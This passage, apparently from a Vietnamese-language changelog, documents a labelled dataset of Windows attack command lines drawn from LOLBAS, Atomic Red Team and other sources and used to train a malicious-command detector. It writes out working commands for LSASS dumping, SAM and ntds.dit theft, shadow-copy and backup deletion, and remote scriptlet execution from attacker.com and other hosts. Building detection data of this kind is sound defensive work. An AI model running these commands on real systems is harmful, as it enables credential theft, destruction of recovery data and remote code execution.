| 1039 | 1 | raw / 664 | alternate_data_stream | <code>Mavinject.exe 4172 /INJECTRUNNING C:\Projects\payload_91:file.dll</code> |
| 1043 | 1 | raw / 671 | alternate_data_stream | <code>MpCmdRun.exe -DownloadFile -url http://192.168.1.100:8080/test_99.exe -path C:\Projects\payload_100.exe:evil.exe</code> |
| 1071 | 1 | raw / 681 | browser_process_callback | <code>msedge.exe --disable-gpu-sandbox --gpu-launcher=&quot;calc.exe &amp;&amp;&quot;</code> |
| 1155 | 1 | raw / 682 | scriptlet_proxy_execution | <code>mshta.exe vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://attacker.com/build_112.sct&quot;&quot;)&quot;))</code> |
| 1150 | 1 | raw / 683 | scriptlet_proxy_execution | <code>mshta.exe javascript:a=GetObject(&quot;script:https://gist.githubusercontent.com/attacker/test/raw/job_113.sct&quot;).Exec();close();</code> |
| 1144 | 1 | raw / 684 | alternate_data_stream | <code>mshta.exe &quot;C:\Users\Public\script_114:file.hta&quot;</code> |
| 2339 | 1 | raw / 706 | alternate_data_stream | <code>print /D:C:\Windows\Temp\evil_135:file.exe C:\Windows\Temp\payload_136.exe</code> |
| 2480 | 1 | raw / 715 | alternate_data_stream | <code>reg export HKLM\SOFTWARE\Microsoft\Evilreg C:\Projects\payload_140:evilreg.reg</code> |
| 2601 | 1 | raw / 718 | alternate_data_stream | <code>regedit /E C:\Windows\Temp\evil_143:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey</code> |
| 2607 | 1 | raw / 719 | alternate_data_stream | <code>regedit C:\Windows\Temp\payload_144:regfile.reg</code> |
| 2614 | 1 | raw / 720 | alternate_data_stream | <code>regini.exe C:\Windows\Temp\test_145:hidden.ini</code> |
| 2619 | 1 | raw / 723 | scriptlet_proxy_execution | <code>regsvr32 /s /n /u /i:http://attacker.com/build_148.sct scrobj.dll</code> |
| 2629 | 1 | raw / 724 | scriptlet_proxy_execution | <code>regsvr32.exe /s /u /i:\172.16.0.5\share\data_149.sct scrobj.dll</code> |
| 2694 | 1 | raw / 729 | scriptlet_proxy_execution | <code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://gist.githubusercontent.com/attacker/test/raw/job_155&quot;)</code> |
| 2666 | 1 | raw / 730 | alternate_data_stream | <code>rundll32 &quot;C:\ProgramData\test_156:ADSDLL.dll&quot;,DllMain</code> |
| 2860 | 1 | raw / 740 | remote_pkcs11_library | <code>scp -o PKCS11Provider=&quot;\\192.168.1.50\share\job_163.dll&quot; . win@github.com:.</code> |
| 2862 | 1 | raw / 750 | remote_pkcs11_library | <code>ssh -o PKCS11Provider=&quot;\\127.0.0.1\Temp\example.dll&quot; win@github.com</code> |
| 2871 | 1 | raw / 753 | alternate_data_stream | <code>tar -xf C:\Users\Public\Libraries\build_174:ads</code> |
| 2985 | 1 | raw / 763 | alternate_data_stream | <code>wmic.exe process call create &quot;C:\Projects\payload_180:program.exe&quot;</code> |
| 2994 | 1 | raw / 766 | remote_stylesheet_execution | <code>wmic.exe process get brief /format:&quot;http://192.168.1.100:8080/test_183.xsl&quot;</code> |
| 2992 | 1 | raw / 767 | remote_stylesheet_execution | <code>wmic.exe process get brief /format:&quot;\\172.16.0.5\share\data_184.xsl&quot;</code> |
| 3024 | 1 | raw / 770 | alternate_data_stream | <code>wscript //e:vbscript C:\Windows\Temp\test_185:script.vbs</code> |
| 3064 | 1 | raw / 772 | update_provider_proxy_execution | <code>wuauclt.exe /UpdateDeploymentProvider \\172.16.0.5\share\data_189.dll /RunHandlerComServer</code> |
| 1116 | 1 | raw / 776 | browser_process_callback | <code>&quot;C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe&quot; --disable-gpu-sandbox --gpu-launcher=&quot;cmd.exe /c calc.exe &amp;&amp;&quot;</code> |
| 1117 | 1 | raw / 779 | browser_process_callback | <code>msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=&quot;calc.exe&quot;</code> |
| 2683 | 1 | raw / 787 | signed_proxy_executable | <code>rundll32.exe advpack.dll,RegisterOCX script_201.exe</code> |
| 2689 | 1 | raw / 794 | signed_proxy_executable | <code>rundll32.exe ieadvpack.dll,RegisterOCX \\192.168.1.50\share\job_208.exe</code> |
| 2674 | 1 | raw / 797 | html_application_proxy | <code>rundll32.exe Mshtml.dll,PrintHTML C:\Projects\payload_211.hta</code> |
| 2704 | 1 | raw / 798 | signed_proxy_executable | <code>rundll32.exe pcwutl.dll,LaunchApplication test_212.exe</code> |
| 2706 | 1 | raw / 815 | signed_proxy_executable | <code>rundll32.exe zipfldr.dll,RouteTheCall C:\Users\Public\Downloads\payload_227.exe</code> |
| 2 | 1 | raw / 818 | credential_process_dump | <code>adplus.exe -hang -pn lsass.exe -o C:\Users\Public\Downloads -quiet</code> |
| 1068 | 1 | raw / 868 | browser_process_callback | <code>mscopilot.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=&quot;notepad.exe &amp;&amp; taskkill /f /im mscopilot.exe &amp;&amp;&quot;</code> |
| 2894 | 1 | raw / 896 | browser_process_callback | <code>teams.exe --disable-gpu-sandbox --gpu-launcher=&quot;calc.exe &amp;&amp;&quot;</code> |
| 2376 | 1 | raw / 938 | scriptlet_proxy_execution | <code>pubprn.vbs 127.0.0.1 script:http://attacker.com/build_352.sct</code> |
| 2979 | 1 | raw / 956 | remote_stylesheet_execution | <code>C:\Windows\System32\Wbem\wmic.EXE os get /format:&quot;http://sec.dashabi.in/javaw2/net/net.xsl&quot;</code> |
| 2982 | 1 | raw / 961 | remote_stylesheet_execution | <code>wmic os get /format:&quot;https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xsl&quot;</code> |
| 2670 | 1 | raw / 962 | comsvcs_minidump | <code>rundll32.exe C:\windows\System32\comsvcs.dll MiniDump 4 kmvciqhl full</code> |
| 2916 | 1 | raw / 964 | recovery_or_audit_inhibition | <code>VssAdmin Delete Shadows /All</code> |
| 1160 | 1 | raw / 966 | scriptlet_proxy_execution | <code>mshta.exe vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:https://webserver/payload.sct&quot;&quot;)&quot;))</code> |
| 1151 | 1 | raw / 967 | scriptlet_proxy_execution | <code>mshta.exe javascript:a=GetObject(&quot;script:https://webserver/payload.sct&quot;).Exec();close();</code> |
| 450 | 1 | raw / 3690 | alternate_data_stream | <code>esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o</code> |
| 446 | 1 | raw / 3773 | credential_directory_database | <code>esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d C:\Windows\Temp\evil_375.dit</code> |
| 2490 | 1 | raw / 3787 | credential_registry_export | <code>reg save HKLM\SECURITY C:\Projects\payload_391.1.bak &amp;&amp; reg save HKLM\SYSTEM C:\Windows\Temp\payload_392.2.bak &amp;&amp; reg save HKLM\SAM C:\Windows\Temp\test_393.3.bak</code> |
| 21 | 1 | LOLBAS_literal / 17 | bits_execution_callback | <code>bitsadmin /create 1 bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1</code> |
| 213 | 1 | LOLBAS_template / 36 | alternate_data_stream | <code>cmd.exe - &lt; C:\Windows\Temp\sample.txt:payload.bat</code> |
| 212 | 1 | LOLBAS_template / 36 | alternate_data_stream | <code>cmd.exe - &lt; C:\Users\Public\sample.txt:payload.bat</code> |
| 211 | 1 | LOLBAS_template / 36 | alternate_data_stream | <code>cmd.exe - &lt; C:\ProgramData\sample.txt:payload.bat</code> |
| 522 | 1 | LOLBAS_template / 91 | indirect_command_execution_poc | <code>forfiles /p c:\windows\system32 /m notepad.exe /c &quot;cmd.exe /c calc.exe&quot;</code> |
| 2337 | 1 | LOLBAS_template / 176 | alternate_data_stream | <code>print /D:C:\ProgramData\sample.txt:file.exe C:\ProgramData\sample.exe</code> |
| 2340 | 1 | LOLBAS_template / 176 | alternate_data_stream | <code>print /D:C:\Windows\Temp\sample.txt:file.exe C:\Windows\Temp\sample.exe</code> |
| 2338 | 1 | LOLBAS_template / 176 | alternate_data_stream | <code>print /D:C:\Users\Public\sample.txt:file.exe C:\Users\Public\sample.exe</code> |
| 2861 | 1 | LOLBAS_template / 223 | remote_pkcs11_library | <code>scp -o PKCS11Provider=&quot;\\93.184.216.34\lab\sample.dll&quot; . win@github.com:.</code> |
| 2858 | 1 | LOLBAS_template / 223 | remote_pkcs11_library | <code>scp -o PKCS11Provider=&quot;\\10.20.30.40\lab\sample.dll&quot; . win@github.com:.</code> |
| 2859 | 1 | LOLBAS_template / 223 | remote_pkcs11_library | <code>scp -o PKCS11Provider=&quot;\\127.0.0.1\lab\sample.dll&quot; . win@github.com:.</code> |
| 3020 | 1 | LOLBAS_template / 268 | alternate_data_stream | <code>echo GetObject(&quot;script:https://93.184.216.34/lab/sample.js&quot;) &gt; C:\Users\Public\sample.txt:hi.js &amp;&amp; wscript.exe C:\Users\Public\sample.txt:hi.js</code> |
| 3018 | 1 | LOLBAS_template / 268 | alternate_data_stream | <code>echo GetObject(&quot;script:https://10.20.30.40/lab/sample.js&quot;) &gt; C:\ProgramData\sample.txt:hi.js &amp;&amp; wscript.exe C:\ProgramData\sample.txt:hi.js</code> |
| 3019 | 1 | LOLBAS_template / 268 | alternate_data_stream | <code>echo GetObject(&quot;script:https://127.0.0.1/lab/sample.js&quot;) &gt; C:\Windows\Temp\sample.txt:hi.js &amp;&amp; wscript.exe C:\Windows\Temp\sample.txt:hi.js</code> |
| 3063 | 1 | LOLBAS_template / 270 | update_provider_proxy_execution | <code>wuauclt.exe /UpdateDeploymentProvider C:\Windows\Temp\sample.dll /RunHandlerComServer</code> |
| 3062 | 1 | LOLBAS_template / 270 | update_provider_proxy_execution | <code>wuauclt.exe /UpdateDeploymentProvider C:\Users\Public\sample.dll /RunHandlerComServer</code> |
| 3061 | 1 | LOLBAS_template / 270 | update_provider_proxy_execution | <code>wuauclt.exe /UpdateDeploymentProvider C:\ProgramData\sample.dll /RunHandlerComServer</code> |
| 2673 | 1 | LOLBAS_template / 299 | html_application_proxy | <code>rundll32.exe Mshtml.dll,PrintHTML C:\ProgramData\sample.hta</code> |
| 2676 | 1 | LOLBAS_template / 299 | html_application_proxy | <code>rundll32.exe Mshtml.dll,PrintHTML C:\Windows\Temp\sample.hta</code> |
| 2675 | 1 | LOLBAS_template / 299 | html_application_proxy | <code>rundll32.exe Mshtml.dll,PrintHTML C:\Users\Public\sample.hta</code> |
| 2702 | 1 | LOLBAS_template / 300 | signed_proxy_executable | <code>rundll32.exe pcwutl.dll,LaunchApplication C:\Windows\Temp\sample.exe</code> |
| 2701 | 1 | LOLBAS_template / 300 | signed_proxy_executable | <code>rundll32.exe pcwutl.dll,LaunchApplication C:\Users\Public\sample.exe</code> |
| 2700 | 1 | LOLBAS_template / 300 | signed_proxy_executable | <code>rundll32.exe pcwutl.dll,LaunchApplication C:\ProgramData\sample.exe</code> |
| 2707 | 1 | LOLBAS_template / 319 | signed_proxy_executable | <code>rundll32.exe zipfldr.dll,RouteTheCall C:\Users\Public\sample.exe</code> |
| 2705 | 1 | LOLBAS_template / 319 | signed_proxy_executable | <code>rundll32.exe zipfldr.dll,RouteTheCall C:\ProgramData\sample.exe</code> |
| 2708 | 1 | LOLBAS_template / 319 | signed_proxy_executable | <code>rundll32.exe zipfldr.dll,RouteTheCall C:\Windows\Temp\sample.exe</code> |
| 2348 | 1 | Atomic_Red_Team / 1 | credential_process_dump | <code>&quot;C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe&quot; -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp</code> |
| 2349 | 1 | Atomic_Red_Team / 2 | credential_process_dump | <code>&quot;C:\AtomicRedTeam\atomics\..\ExternalPayloads\procdump.exe&quot; -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp</code> |
| 2495 | 1 | Atomic_Red_Team / 3 | credential_registry_export | <code>reg save HKLM\sam %temp%\sam</code> |
| 2497 | 1 | Atomic_Red_Team / 4 | credential_registry_export | <code>reg save HKLM\system %temp%\system</code> |
| 2496 | 1 | Atomic_Red_Team / 5 | credential_registry_export | <code>reg save HKLM\security %temp%\security</code> |
| 2485 | 1 | Atomic_Red_Team / 6 | credential_registry_export | <code>reg export HKLM\sam %temp%\sam</code> |
| 2487 | 1 | Atomic_Red_Team / 7 | credential_registry_export | <code>reg export HKLM\system %temp%\system</code> |
| 2486 | 1 | Atomic_Red_Team / 8 | credential_registry_export | <code>reg export HKLM\security %temp%\security</code> |
| 2494 | 1 | Atomic_Red_Team / 9 | credential_registry_export | <code>reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE</code> |
| 1961 | 1 | Atomic_Red_Team / 10 | credential_directory_database | <code>ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:\Windows\Temp\ntds_T1003&quot; q q</code> |
| 2925 | 1 | Atomic_Red_Team / 13 | recovery_or_audit_inhibition | <code>wbadmin delete catalog -quiet</code> |
| 17 | 1 | Atomic_Red_Team / 14 | recovery_or_audit_inhibition | <code>bcdedit.exe /set {default} recoveryenabled no</code> |
| 480 | 1 | Atomic_Red_Team / 15 | alternate_data_stream | <code>extrac32 c:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe</code> |
| 484 | 1 | Atomic_Red_Team / 16 | alternate_data_stream | <code>findstr /V /L W3AllLov3DonaldTrump c:\ADS\procexp.exe &gt; c:\ADS\file.txt:procexp.exe</code> |
| 162 | 1 | Atomic_Red_Team / 17 | alternate_data_stream | <code>certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt</code> |
| 2341 | 1 | Atomic_Red_Team / 19 | alternate_data_stream | <code>print /D:c:\ADS\file.txt:autoruns.exe c:\ADS\Autoruns.exe</code> |
| 2483 | 1 | Atomic_Red_Team / 20 | alternate_data_stream | <code>reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ADS\file.txt:evilreg.reg</code> |
| 2603 | 1 | Atomic_Red_Team / 21 | alternate_data_stream | <code>regedit /E c:\ADS\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey</code> |
| 463 | 1 | Atomic_Red_Team / 23 | alternate_data_stream | <code>esentutl.exe /y c:\ADS\autoruns.exe /d c:\ADS\file.txt:autoruns.exe /o</code> |
| 2625 | 1 | Atomic_Red_Team / 24 | scriptlet_proxy_execution | <code>C:\Windows\system32\regsvr32.exe /s /u /i:&quot;C:\AtomicRedTeam\atomics\T1218.010\src\RegSvr32.sct&quot; scrobj.dll</code> |
| 2631 | 1 | Atomic_Red_Team / 25 | scriptlet_proxy_execution | <code>C:\Windows\system32\regsvr32.exe /s /u /i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll</code> |
| 2696 | 1 | Atomic_Red_Team / 26 | scriptlet_proxy_execution | <code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct&quot;).Exec();window.close();</code> |
| 2699 | 1 | Atomic_Red_Team / 27 | signed_proxy_executable | <code>rundll32.exe pcwutl.dll,LaunchApplication %windir%\System32\notepad.exe</code> |
| 2475 | 1 | Atomic_Red_Team / 29 | security_policy_or_accessibility_hijack | <code>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe&quot; /v Debugger /d &quot;C:\Windows\System32\cmd.exe&quot;</code> |
| 482 | 1 | Atomic_Red_Team / 30 | group_policy_credential_search | <code>findstr /S cpassword %logonserver%\sysvol\*.xml</code> |
| 2344 | 0 | benign_counterpart_windows6 / 3525 | normal administration counterpart | <code>print /d:\copyroom\printer1 c:\accounting\report.txt</code> |

###### Mẫu cũ được đưa ra ngoài

| Record cũ | Nhãn | Lệnh | Lý do |
| ---: | ---: | --- | --- |
| 2245 | 0 | <code>procdump -ma 1234 -p &quot;\Process(svchost#87)\Handle Count&quot; 10000</code> | ProcDump chỉ có PID, chưa xác định tên tiến trình đích; không đủ ngữ cảnh gán GOOD. Giữ các ví dụ debug notepad/outlook/w3wp có nguồn. |
| 2246 | 0 | <code>procdump -ma 4572</code> | ProcDump chỉ có PID, chưa xác định tên tiến trình đích; không đủ ngữ cảnh gán GOOD. Giữ các ví dụ debug notepad/outlook/w3wp có nguồn. |
| 2248 | 0 | <code>procdump -mm -ma 4572</code> | ProcDump chỉ có PID, chưa xác định tên tiến trình đích; không đủ ngữ cảnh gán GOOD. Giữ các ví dụ debug notepad/outlook/w3wp có nguồn. |
| 2535 | 1 | <code>rundll32 SHELL32.DLL,ShellExec_RunDLL &quot;cmd.exe&quot; &quot;/c echo hi&quot;</code> | Generic ShellExec_RunDLL launch: ordinary shell API; current GOOD/BAD examples do not show a reliable attack distinction. |
| 2575 | 0 | <code>rundll32.exe  shell32.dll,ShellExec_RunDLL C:\Windows\System32\calc.exe</code> | Generic ShellExec_RunDLL launch: ordinary shell API; current GOOD/BAD examples do not show a reliable attack distinction. |

###### Nguồn và nhật ký

- [LOLBAS](https://lolbas-project.github.io/), [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team), [Microsoft ProcDump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump). Không tải/chạy prerequisite hoặc artifact payload của các test.
- Atomic Red Team được ghim commit trong atomic_sources.json; mỗi lệnh có technique/test GUID/source hash. Các template mới có URL YAML LOLBAS và hash mẫu trước thay tham số.
- D:/APT/windows-7-expand-20261109/provenance.jsonl chứa nguồn và family cho toàn bộ dữ liệu; decisions.jsonl ghi record/hash của mẫu không thêm, không sao chép các payload bị hạn chế.
- Nhật ký của bản 7 trước lần bổ sung này vẫn nằm tại D:/APT/windows-7-update-20261109/ và D:/APT/windows-7-review-20261109/.
- SHA-256 trước: `c0a812c664abf33cb2cd62650ba3d9236770a1e756e4629e52f3049e91e7824c`.
- SHA-256 sau: `1561f0cc372eaba9134c58f11352ec15e51acc0cf10f23d45dfe219ebdbc8111`.
